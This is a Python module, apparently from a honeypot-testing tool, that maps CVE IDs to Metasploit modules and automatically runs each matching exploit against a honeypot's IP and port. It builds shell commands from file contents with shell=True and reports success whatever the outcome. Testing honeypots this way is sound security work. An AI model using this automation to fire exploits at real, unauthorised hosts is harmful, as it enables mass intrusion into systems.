# This script finds the metasploit module for a given CVE.
# It then runs the exploit against the honeypot.
# It is required to have metasploit installed.
import shutil
import subprocess
import time

from pathlib import Path
from .base_attack import AttackResults, BaseAttack, BaseHoneypot


class Exploit:
    def __init__(self, cve: str, module: list[str]) -> None:
        """
        Initialize a new Exploit object with the given CVE and module info.

        Args:
            cve (str): CVE ID of the exploit.
            module (list[str]): Modules pretaining to the exploit.
        """
        self.cve = cve
        self.module = module


class SoftwareExploit(BaseAttack):
    METASPLOIT: str = "/opt/metasploit-framework/bin/msfconsole"
    METASPLOIT_UPDATE: str = "/opt/metasploit-framework/bin/msfupdate"

    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initialize a new SoftwareExploit object.

        Args:
            honeypot (BaseHoneypot): Honeypot object to get the information
                                     for performing the software exploits on.
        """
        super().__init__(honeypot)
        self.exploits: list[Exploit] = []
        self.parent_path = Path(__file__).resolve().parent.parent
        self.all_cves_path: Path = (
            self.parent_path / "passive_attacks" / "results" / "all_cves.txt"
        )
        self.metasploit_modules_file: Path = (
            self.parent_path / "passive_attacks" / "results" / "metasploit_modules.txt"
        )

    def run_command_with_input(self,
                               command: str,
                               input_str: str) -> tuple[str, str]:
        """
        Runs desired command with a given input and returns the output.

        Args:
            command (str): Command to run.
            input_str (str): Input string to pass to the command.

        Returns:
            tuple[str, str]: Outputs from STDOUT and STDERR respectively.
        """
        process = subprocess.Popen(command,
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   shell=True)
        out, err = process.communicate(input_str.encode())
        return (out.decode(), err.decode())

    def is_msfconsole_installed(self) -> bool:
        """
        Check if msfconsole is installed.

        Returns:
            bool: True if msfconsole is installed, False otherwise.
        """
        print("Checking if msfconsole is installed...")
        return shutil.which(self.METASPLOIT) is not None

    def update_metasploit(self) -> None:
        """
        Update metasploit.
        """
        print("Updating metasploit...")
        command = f"{self.METASPLOIT_UPDATE}"
        try:
            output: str = subprocess.check_output(command, shell=True).decode()
            print(f"Metasploit output: {output}")
        except subprocess.CalledProcessError:
            print("Failed to update metasploit")

    def remove_duplicates(self) -> None:
        """
        Remove duplicates from the all_cves.txt file.
        """
        print("Removing duplicates from all_cves.txt...")
        lines_seen: set[str] = set()
        output_lines: list[str] = []
        with open(self.all_cves_path, "r") as file:
            for line in file:
                if line not in lines_seen:
                    output_lines.append(line)
                    lines_seen.add(line)
        with open(self.all_cves_path, "w") as file:
            for line in output_lines:
                file.write(line)

    def read_from_metasploit_modules_file(self) -> None:
        """
        Read the metasploit modules from the metasploit_modules.txt file.
        """
        print(f"Reading metasploit modules from {self.metasploit_modules_file}...")
        if not self.metasploit_modules_file.exists():
            print(f"The file {self.metasploit_modules_file} does not exist.")
            return
        with open(self.metasploit_modules_file, "r") as file:
            modules: list[str] = file.read().splitlines()
            for module in modules:
                self.exploits.append(Exploit("CVE", module))

    def find_module(self, cve: str) -> None:
        """
        Find the metasploit module for a given CVE.

        Args:
            cve (str): CVE ID of the exploit.
        """
        print(f"Finding module for {cve}...")
        command = f"{self.METASPLOIT} -q -x 'search {cve}; exit'"

        try:
            output, err = self.run_command_with_input(command, 'y')
            if err:
                print(f"Error while running command: {err}")
            lines: list[str] = output.split("\n")
            start_parsing: bool = False
            for line in lines:
                # This is the line just before the actual module lines
                if "----" in line:
                    # Set the flag to start parsing the next lines
                    start_parsing = True
                    continue
                if start_parsing:
                    elements: list[str] = line.split()
                    # If the line has less than 1 field, it's not a module line
                    if len(elements) < 1:
                        break
                    # The first element is always the index, the second
                    # element is the module name
                    module: str = elements[1]
                    self.exploits.append(Exploit(cve, module))
                    print(f"Found module {module} for {cve}!")
        except Exception as e:
            print(f"Failed to find module for CVE {cve}. Error: {e}")

    def get_cves_from_file(self) -> None:
        """
        Get the CVEs from the all_cves.txt file.
        """
        print("Getting CVEs from all_cves.txt...")
        if not self.all_cves_path.exists():
            print(f"The file {self.all_cves_path} does not exist.")
            return
        with open(self.all_cves_path, "r") as file:
            cves: list[str] = file.read().splitlines()
            for cve in cves:
                self.find_module(cve)

    def run_exploit(self, module: str) -> None:
        """
        Run the exploit against the honeypot.

        Args:
            module (str): The metasploit module to use.
        """
        print(f"Running exploit {module} on {self.honeypot.ip}:{self.honeypot.port}...")
        command: str = f"{self.METASPLOIT} -q -x 'use {module}; set RHOSTS {self.honeypot.ip}; set RPORT {self.honeypot.port}; run; exit'"
        try:
            output: str = subprocess.check_output(command, shell=True).decode()
            print(f"Exploit output: {output}")
        except subprocess.CalledProcessError:
            print(f"Failed to run exploit {module} on {self.honeypot.ip}:{self.honeypot.port}")

    def run_attack(self) -> AttackResults:
        """
        Run the software exploit attack against the vulnerable software
        in the honeypot.

        Returns:
            AttackResults: The results of the attack.
        """
        print(f"Running software exploit attack on {self.honeypot.ip}:{self.honeypot.port}...")
        start_time: float = time.time()
        end_time: float
        time_taken: float

        if self.is_msfconsole_installed():
            if input("Do you want to update metasploit? (y/n): ") == "y":
                self.update_metasploit()
            if self.metasploit_modules_file.exists():
                # TODO: Handle user input for different cases of acceptable
                #  input and if they type in the wrong input when they meant y.
                if input(f"Do you want to read modules from {self.metasploit_modules_file}? (y/n): ") == "y":
                    print(f"Reading metasploit modules from {self.metasploit_modules_file}...")
                    self.read_from_metasploit_modules_file()
                    for exploit in self.exploits:
                        self.run_exploit(exploit.module)
                    end_time = time.time()
                    time_taken = end_time - start_time
                    return (False,
                            "Software exploit attack successful",
                            time_taken,
                            self.metasploit_modules_file)

            self.remove_duplicates()
            self.get_cves_from_file()

            with open(self.metasploit_modules_file, 'w') as f:
                for exploit in self.exploits:
                    f.write(f"{exploit.module}\n")
                    print(f"Found module {exploit.module} for {exploit.cve}")
                    self.run_exploit(exploit.module)

            end_time = time.time()
            time_taken = end_time - start_time
            return (False,
                    "Software exploit attack successful",
                    time_taken,
                    self.metasploit_modules_file)
        else:
            print("msfconsole is not installed or not found, please set the METASPLOIT variable to point to the msfconsole binary installed in your computer.")
            end_time = time.time()
            time_taken = end_time - start_time
            return (False,
                    "msfconsole is not installed or not found, please set the METASPLOIT variable to point to the msfconsole binary installed in your computer.",
                    time_taken,
                    self.metasploit_modules_file)
